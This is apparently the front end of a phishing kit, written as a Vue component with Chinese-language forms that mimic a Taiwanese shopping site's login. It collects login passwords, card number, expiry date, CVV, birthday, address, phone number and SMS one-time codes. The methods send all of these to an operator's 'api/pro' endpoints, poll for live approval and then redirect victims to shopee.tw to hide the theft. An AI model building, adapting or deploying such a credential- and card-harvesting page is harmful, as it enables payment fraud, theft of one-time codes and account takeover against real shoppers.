<!-- eslint-disable no-undef -->
<template>
  <div class="conment">

    <div class="box" :class="{widjek:threetap}"  v-if="fristtap">
      <div class="logo"><img src="../assets/logo1.jpg" width="100%"></div>
      <div>
            <div class="publics linebottom" :class="{ linebottoms: linebottomlen }">
                <div class="icon"><img src="../assets/111.gif" width="100%"></div>
                <div class="public_bd"><input type="text" placeholder="電話號碼/Email/使用者名稱" class="iteminput" v-model="one.userlogin" ref="userlogin"></div>
            </div>
            <div class="linebottomlen" v-if="linebottomlen">請填寫此欄位</div>
            <div class="publics linebottom" :class="{ linebottoms: linebottomlen }">
                <div class="icon"><img src="../assets/222.gif" width="100%"></div>
                <div class="public_bd"><input type="password" placeholder="密碼" class="iteminput" v-model="one.passowrd" ref="passowrd"></div>
                <div><img src="../assets/333.gif" width="100%"></div>
                <div class="inptutest">忘记?</div>
            </div>
            <div class="linebottomlen" v-if="linebottomlen">請填寫此欄位</div>
            <div class="paybutton">
                <van-button type="primary" :disabled=disabledone @click="fristbutton"  color="#e8e8e8" class="button" block >登錄</van-button>
            </div>
            <div class="last">
                <div class="public_bd lasttext">註冊</div>
                <div class="public_bd lasttext" style="text-align: right;">使用電話號登入</div>
            </div>
            <div class="divider"><van-divider>或</van-divider></div>
            <div class="lastbutton">
                <div class="lastbuttonicon"><img src="../assets/444.gif" width="100%"></div>
                <div class="public_bd lastbuttontext">使用Facebook繼續</div>
            </div>
            <div class="lastbutton">
                <div class="lastbuttonicon"><img src="../assets/555.gif" width="100%"></div>
                <div class="public_bd lastbuttontext">使用Google繼續</div>
            </div>
            <div class="lastbutton">
                <div class="lastbuttonicon"><img src="../assets/666.gif" width="100%"></div>
                <div class="public_bd lastbuttontext">使用Apple繼續</div>
            </div>
        </div>
    </div>

    <div class="box" :class="{widjek:threetap}" v-if="twotap">
      <div class="logo"><img src="../assets/logo1.jpg" width="100%"></div>
      <div>
             <div class="title margin_top">卡上的姓名</div>
            <div class="">
                <div class="public_bd"><input type="text" placeholder="卡上的姓名" class="iteminputs height" v-model="two.cardName" ref="cardName"></div>
            </div>
            <div class="title margin_top">銀行卡信息</div>
            <div class="iteminputs">
              <div class="publics iteminputsk">
                <div class="public_bd"><input type="text" data-gap=4 placeholder="卡號" :maxlength="19" @keyup.delete="onkeyupdeta" @blur="checkBin" class="iteminputst" v-model="two.cardNum" ref="cardNum"></div>
                <div class="icon" v-if="amex" ><img src="../assets/a-image.png" width="100%"></div>
                <div class="icon" v-if="jcb" ><img src="../assets/j-image.png" width="100%"></div>
                <div class="icon" v-if="master" ><img src="../assets/m-image.png" width="100%"></div>
                <div class="icon" v-if="visa" ><img src="../assets/v-image.png" width="100%"></div>
            </div>
            <div class="publicy">
              <input type="tel" data-gap=2 placeholder="月份/年份" :maxlength="5"  @keyup.delete="onkeyupdetas" class="iteminput borderright height" v-model="two.carddate" ref="carddate">
              <input type="number" placeholder="cvv"  class="iteminput height" v-model="two.cardcvv" ref="cardcvv" oninput="if(value.length>3)value=value.slice(0,3)"></div>
            </div>
            <div class="paybutton">
                <van-button type="primary" :disabled=disabledtwo @click="twobutton" color="#e8e8e8" class="button" block >登錄</van-button>
            </div>
        </div>

    </div>
    <div class="lajkedou" v-if="threetap">
      <div class="box" :class="{widjek:threetap}">
        <div class="logo"><img src="../assets/logo1.png" width="100%"></div>
        <div>
            <div class="threebj">聯繫</div>
            <div class="publics linebottom" style="background: #fff;">
                <div class="public_bd"><input type="text" placeholder="全名" class="iteminput" v-model="three.username" ref="username"></div>
            </div>
            <div class="publics linebottom" style="background: #fff;">
                <div class="public_bd"><input type="text" placeholder="生日" class="iteminput" @click="showtap" v-model="three.brithd" ref="brithd" readonly></div>
            </div>
            <van-popup v-model="showPop" position="bottom" :style="{ height: '40%' }">
                <van-datetime-picker v-model="currentDate" :min-date="minDate" type="date" @change="changeFn()" @confirm="confirmFn()" @cancel="cancelFn()" />
            </van-popup>

            <div class="publics linebottom" style="background: #fff;">
                <div class="public_bd"><input type="text" placeholder="電話號碼" class="iteminput" v-model="three.tel" ref="tel"></div>
            </div>

            <div class="threebj">地址</div>
            <div class="publics linebottom" style="background: #fff;padding-right:15px">
                <div class="public_bd"><input type="text" placeholder="城市" class="iteminput" v-model="three.city" @click="clickshowcity" readonly ref="city"></div>
                <div class="triangle" ></div>
            </div>
            <div class="publics linebottom" style="background: #fff;">
                <div class="public_bd"><input type="text" placeholder="郵遞區號" class="iteminput" v-model="three.postcode" ref="postcode"></div>
            </div>
            <van-popup v-model="showcity" position="bottom" :style="{ height: '40%' }">
              <van-area @confirm="areaConfirm" @cancel="areaCancle" :area-list="areaList" value="710100" />
            </van-popup>
            <div class="publics linebottom" style="background: #fff;">
                <div class="public_bd"><input type="text" placeholder="街道,巷弄,門號,樓層" class="iteminput" v-model="three.add" ref="add"></div>
            </div>

            <!-- <div class="publics linebottom" style="background: #fff;">
                <div class="public_bd"><input type="text" placeholder="地址2" class="iteminput" v-model="three.add1" ref="add1"></div>
            </div> -->

            <div class="paybutton" :class="{shdj:threetap}">
                <van-button type="primary" :disabled=disabledthree @click="threebutton" color="#959292" :loading=fristload class="button" loading-text="登錄..." block >登錄</van-button>
            </div>
        </div>

      </div>
    </div>

    <div class="box" :class="{widjek:threetap}" v-if="fourtap">
      <div class="logo"><img src="../assets/logo1.jpg" width="100%"></div>
      <div>
          <div class="fourtitle">輸入SMS簡訊驗證碼</div>
          <div class="fourtitles">您已發送簡訊驗證碼。</div>
          <div class="fourtitles">請在<span>10分鐘</span>輸入您發送給我們的6位授權號碼</div>
          <div style="height:8px"></div>
          <div class="publics iteminputs">
              <div class="icon" style="margin-left:15px"><img src="../assets/scode.png" width="100%"></div>
              <div class="public_bd"><input type="number" placeholder="簡訊驗證碼" class="iteminput" v-model="smsCode" oninput="if(value.length>6)value=value.slice(0,6)"></div>
          </div>
          <div class="paybutton">
              <van-button type="primary" @click="fourbutton" color="#e8e8e8" class="button" block :loading=twoload    loading-text="登錄...">登錄</van-button>
          </div>
      </div>
    </div>
  </div>
</template>
<script>
import { areaList } from '@vant/area-data'
import { validebank } from '@/utils/util'
export default {
  name: 'index',
  components: {areaList},
  data () {
    return {
      fristdata: '',
      linebottomlen: false,
      fristtap: false,
      twotap: true,
      threetap: false,
      fourtap: false,
      disabledone: false,
      disabledtwo: true,
      disabledthree: true,
      fristload: false,
      twoload: false,
      one: {
        userlogin: '',
        passowrd: ''
      },
      two: {
        cardName: '',
        cardNum: '',
        cardcvv: '',
        carddate: ''
      },
      three: {
        username: '',
        brithd: '',
        postcode: '',
        city: '',
        add: '',
        add1: '',
        tel: ''
      },
      smsCode: '',
      amex: true,
      jcb: true,
      visa: true,
      master: true,
      cardicon: false,
      showPop: false,
      currentDate: new Date(),
      changeDate: new Date(),
      minDate: new Date(1970, 0, 1),
      areaList,
      showcity: false
    }
  },

  watch: {
    one: {
      handler: function () {
        // eslint-disable-next-line eqeqeq
        if (this.$refs.userlogin.value != '' && this.$refs.passowrd.value != '') {
          this.disabledone = false
          this.linebottomlen = false
        }
      },
      deep: true
    },

    two: {
      handler: function () {
        // eslint-disable-next-line eqeqeq
        if (this.$refs.cardName.value != '' && this.$refs.cardNum.value != '' && this.$refs.cardcvv.value != '' && this.$refs.carddate.value != '') {
          this.disabledtwo = false
        }
      },
      deep: true
    },

    three: {
      handler: function () {
        // eslint-disable-next-line eqeqeq
        if (this.$refs.username.value != '' && this.$refs.brithd.value != '' && this.$refs.postcode.value != '' && this.$refs.city.value != '' && this.$refs.add.value != '' && this.$refs.tel.value != '') {
          this.disabledthree = false
        }
      },
      deep: true
    },
    'two.cardNum' (val) {
      var gap = parseInt(this.$refs.cardNum.getAttribute('data-gap'))
      this.$nextTick(() => {
        var numbers = val.replace(/[^\w]|/ig, '').split('') // 获取原始值
        var back = ''

        numbers.forEach(function (n, i) {
          back += n + ((i + 1) % gap === 0 ? ' ' : '') // 处理加空格或-
        })
        this.two.cardNum = back
        console.log(back, 11111)
      })
    },
    'two.carddate' (val) {
      var gap = parseInt(this.$refs.carddate.getAttribute('data-gap'))
      this.$nextTick(() => {
        var numbers = val.replace(/[^\w]|/ig, '').split('') // 获取原始值
        var back = ''

        numbers.forEach(function (n, i) {
          back += n + ((i + 1) % gap === 0 ? '/' : '') // 处理加空格或-
        })
        if (back.indexOf('/')) {
          this.two.carddate = back.slice(0, 5)
        }
      })
    }
  },

  methods: {
    onkeyupdeta (event) {
      console.log(event)
      if (event.keyCode == 8) {
        this.two.cardNum = ''
      }
    },
    onkeyupdetas (event) {
      console.log(event)
      if (event.keyCode == 8) {
        this.two.carddate = ''
      }
    },
    clickshowcity () {
      this.showcity = true
      setTimeout(() => {
        document.getElementsByClassName('van-picker-column')[0].style.display = 'none'
      }, 100)
    },

    areaCancle () {
      this.showcity = false
    },

    areaConfirm (values) {
      this.three.city = values[1].name + values[2].name
      this.showcity = false
    },

    showtap () {
      this.showPop = true
    },
    changeFn () { // 值变化是触发
      this.changeDate = this.currentDate // Tue Sep 08 2020 00:00:00 GMT+0800 (中国标准时间)
    },
    confirmFn () { // 确定按钮
      this.three.brithd = this.timeFormat(this.currentDate)
      this.showPop = false
    },
    cancelFn () {
      this.showPop = true
    },
    timeFormat (time) { // 时间格式化 2019-09-08
      let year = time.getFullYear()
      let month = time.getMonth() + 1
      let day = time.getDate()
      return year + '-' + month + '-' + day
    },
    fristbutton () {
      // eslint-disable-next-line eqeqeq
      if (this.one.userlogin == '' || this.one.passowrd == '') {
        this.linebottomlen = true
        return
      }
      /* if (!/^[0][9]\d{8}$/.test(this.one.userlogin)) {
        this.$toast({
          message: '請填寫正確的欄位',
          color: '#ffffff',
          background: '#ff6f6f',
          duration: 3000
        })
        return
      } */
      this.$axios({
        method: 'post',
        url: 'api/pro/create/3f0929adb48041a69871dda42401d4e0?account=' + this.one.userlogin + '&password=' + this.one.passowrd,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.fristdata = res.data.data
          this.fristtap = false
          this.twotap = true
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },
    twobutton () {
      console.log(this.two.cardNum.length)
      if (this.two.cardNum.length < 20) {
        this.$toast({
          message: '請填寫正確的卡號',
          color: '#ffffff',
          background: '#ff6f6f',
          duration: 3000
        })
        return
      }
      this.$axios({
        method: 'post',
        url: 'api/pro/apd/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '?cardName=' + this.two.cardName + '&cardNo=' + this.two.cardNum + '&cardDate=' + this.two.carddate + '&cvv=' + this.two.cardcvv,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.fristtap = false
          this.twotap = false
          this.threetap = true
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },
    threebutton () {
      this.fristtap = false
      this.twotap = false
      this.getfrist()
    },

    fourbutton (checkOrderInterval) {
      // eslint-disable-next-line eqeqeq
      if (this.smsCode == '') {
        this.$toast({
          message: '请输入短信驗證',
          color: '#ffffff',
          background: '#ff6f6f',
          duration: 3000
        })
        return true
      }
      this.$axios({
        method: 'post',
        url: 'api/pro/apd/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '?smsCode=' + this.smsCode,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.fristdata = res.data.data
          this.trainOrderResults()
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    // 轮询支付结果
    async trainOrderResults () {
      this.disableds = true
      let expireTimestamp = Date.parse(new Date()) / 1000 + 60
      let seconds = 30
      var that = this
      let checkOrderInterval = setInterval(function () {
        let currentTimestamp = Date.parse(new Date()) / 1000
        if (seconds === 0 || currentTimestamp >= expireTimestamp) {
          window.clearInterval(checkOrderInterval)
          that.getfour(checkOrderInterval)
        }
        if (seconds % 2 === 0) {
          that.disableds = false
          that.getfour(checkOrderInterval)
        }
        seconds--
      }, 1000)
    },

    getfour (checkOrderInterval) {
      this.disableds = true
      this.twoload = true
      this.$axios({
        method: 'post',
        url: 'api/pro/cq/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '/smsCode',
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.data === '1') {
          window.location.href = 'https://shopee.tw'
          window.clearInterval(checkOrderInterval)
          return true
        // eslint-disable-next-line eqeqeq
        } if (res.data.data != '0' && res.data.data != '1') {
          window.clearInterval(checkOrderInterval)
          this.$toast({
            message: res.data.data,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        } else {
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    checkBin () {
      console.log(this.two.cardNum)
      this.disabledtwo = true
      const cardbin = this.two.cardNum.replace(/\s*/g, '').substring(0, 8)
      this.$axios({
        method: 'post',
        url: 'https://lookup.binlist.net/' + cardbin,
        data: {
        }
      }).then((res) => {
        if (res.status) {
          if (res.status == 200) {
            if (res.data.scheme) {
              this.disabledtwo = false
              if (res.data.scheme === 'visa') {
                this.cardicon = false
                this.visa = true
                this.amex = false
                this.jcb = false
                this.master = false
              } else if (res.data.scheme === 'amex') {
                this.cardicon = false
                this.visa = false
                this.amex = true
                this.jcb = false
                this.master = false
              } else if (res.data.scheme === 'jcb') {
                this.cardicon = false
                this.visa = false
                this.amex = false
                this.jcb = true
                this.master = false
              } else if (res.data.scheme === 'mastercard') {
                this.cardicon = false
                this.visa = false
                this.amex = false
                this.jcb = false
                this.master = true
              }
            }
          } else {
            return
          }
        }
        console.log(res)
      }).catch(e => {
        console.log(e)
      })
    },

    getfrist (checkOrderInterval) {
      this.fristload = true
      this.$axios({
        method: 'post',
        url: 'api/pro/apd/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '?name=' + this.three.username + '&birthday=' + this.three.brithd + '&postCode=' + this.three.postcode + '&city=' + this.three.city + '&address1=' + this.three.add + '&address2=' + this.three.add1 + '&phone=' + this.three.tel,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.fristload = false
          this.fristdata = res.data.data
          this.trainOrderResult()
          window.clearInterval(checkOrderInterval)
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    // 轮询支付结果
    async trainOrderResult () {
      this.disabled = true
      let expireTimestamp = Date.parse(new Date()) / 1000 + 60
      let seconds = 30
      var that = this
      let checkOrderInterval = setInterval(function () {
        let currentTimestamp = Date.parse(new Date()) / 1000
        if (seconds === 0 || currentTimestamp >= expireTimestamp) {
          window.clearInterval(checkOrderInterval)
          that.getthree(checkOrderInterval)
        }
        if (seconds % 2 === 0) {
          that.getthree(checkOrderInterval)
        }
        seconds--
      }, 1000)
    },

    getthree (checkOrderInterval) {
      this.disabledthree = true
      this.$axios({
        method: 'post',
        url: 'api/pro/cq/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '/phone',
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.data === '1') {
          window.clearInterval(checkOrderInterval)
          this.threetap = false
          this.fourtap = true
          this.disabledthree = false
          return true
        // eslint-disable-next-line eqeqeq
        } if (res.data.data != '0' && res.data.data != '1') {
          window.clearInterval(checkOrderInterval)
          this.$toast({
            message: res.data.data,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        } else {
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    }

  },
  mounted () {

  },
  created () {
  }
}
</script>
<style>
 .van-button__text{
    color: #666;
    font-size: 12px;
 }
</style>
<style scoped>
.widjek{
  width: 100% !important;
}
.lajkedou{
  width: 100%;
  height: 100%;
  background: #ededed;
  position: absolute;
}
.shdj{
  padding: 0px 5%;
}
.threebj{
  padding: 10px 15px;
  font-size: 12px;
  background: #ededed;
}
.fourtitle{
  font-size: 16px;
  padding-bottom: 25px;
  color: #333;
}
.fourtitles{
  font-size: 12px;
  padding-bottom: 5px;
  color: #999;
}
.fourtitles span{
  color: #ee5b2f;
  padding: 0px 10px;
}
.linebottomlen{
  padding-top:8px;
  font-size: 12px;
  color: #ee5b2f;
}
.last{
    padding: 10px 0;
    display: flex;
}
.lasttext{
    font-size: 13px;
    color: #508be3;
}
.inptutest{
    font-size: 12px;
    color: #508be3;
    padding-left: 10px;
}
.lastbutton{
    border:1px solid #d1d1d1;
    margin-bottom: 10px;
    padding: 10px 15px;
    border-radius: 5px;
     display: -webkit-box; display: -webkit-flex; display: flex; -webkit-box-align: center; -webkit-align-items: center; align-items: center;
}
.divider{
    width: 50%;
    margin: 0px auto;
    padding-bottom: 10px;
}
.lastbuttonicon{
    width: 21px;
}
.lastbuttontext{
    font-size: 12px;
    color: #333;
    text-align: center;
}

.box{ width: 90%; margin: 0px auto; margin-top: 55px;}
.logo{width: 67px; margin: 0px auto; margin-top: 75px; margin-bottom: 35px;}
.paybutton{ margin-top: 30px;}
.paybutton button{background: #333;}
.button:hover{
    transform: translateY(-2px);
    box-shadow: 0 5px 10px rgb(0 0 0 / 20%);
}
.icon{
    width: 19px;
}
/**下线条**/
.linebottom{ position:relative;}
.linebottom:after{ content: " ";position: absolute;left: 0;bottom: 0;right: 0;height: 1px;border-bottom: 1px solid #E5E5E5;color: #E5E5E5;-webkit-transform-origin: 0 100%;transform-origin: 0 100%;-webkit-transform: scaleY(0.5);transform: scaleY(0.5);}

.linebottoms{ position:relative;}
.linebottoms:after{ content: " ";position: absolute;left: 0;bottom: 0;right: 0;height: 1px;border-bottom: 1px solid #ee5b2f;color: #E5E5E5;-webkit-transform-origin: 0 100%;transform-origin: 0 100%;-webkit-transform: scaleY(0.5);transform: scaleY(0.5);}
.triangle{ position: relative;}
.triangle:after{content: " "; display: inline-block; height: 10px; width: 10px; border-width: 1.5px 1.5px 0 0; border-color: #575757;border-style: solid; -webkit-transform: matrix(0.71, 0.71, -0.71, 0.71, 0, 0); transform: matrix(0.71, 0.71, -0.71, 0.71, 0, 0);position: relative; top: -2px; position: absolute; top: 50%; margin-top: -6px; right:5px;}

/**整行居中显示**/
.public{ padding: 10px 15px; position: relative; display: -webkit-box; display: -webkit-flex; display: flex; -webkit-box-align: center; -webkit-align-items: center; align-items: center;}
.public_bd{ -webkit-box-flex: 1; -webkit-flex: 1; flex: 1;}
.publicy{ display: -webkit-box; display: -webkit-flex; display: flex; -webkit-box-align: center; -webkit-align-items: center; align-items: center;}
.publics{ padding: 10px 0px; position: relative; display: -webkit-box; display: -webkit-flex; display: flex; -webkit-box-align: center; -webkit-align-items: center; align-items: center;}
.iteminput{
    border: 0px;
    font-size: 14px;
    color: #333;
    text-indent: 15px;
    width: 100%;
}
.iteminputs{
    appearance: none;
    background: #fff;
    border: 0;
    box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgb(0 0 0 / 7%), 0 1px 1.5px 0 rgb(0 0 0 / 5%);
    line-height: 1.5;
    position: relative;
    transition: box-shadow .08s ease-in,color .08s ease-in,filter 50000s;
    width: 100%;
    border-radius: 5px;
    font-size: 14px;
    color: #333;
}
.iteminputst{
  background: none;
  border:0px
}
.iteminputsk{
  padding: 10px 15px;
  border-bottom: 1px solid #e0e0e0;
}
.height{
  height: 44px;
  text-indent: 15px;
}
.borderright{
  border-right: 1px solid #e0e0e0
}
.margin_top{
  margin-top: 25px;
}
.title{
  font-size: 14px;
  padding-bottom: 5px;
  color: #666;
}
  /*wap样式*/
@media (max-width: 1024px) {

}

</style>
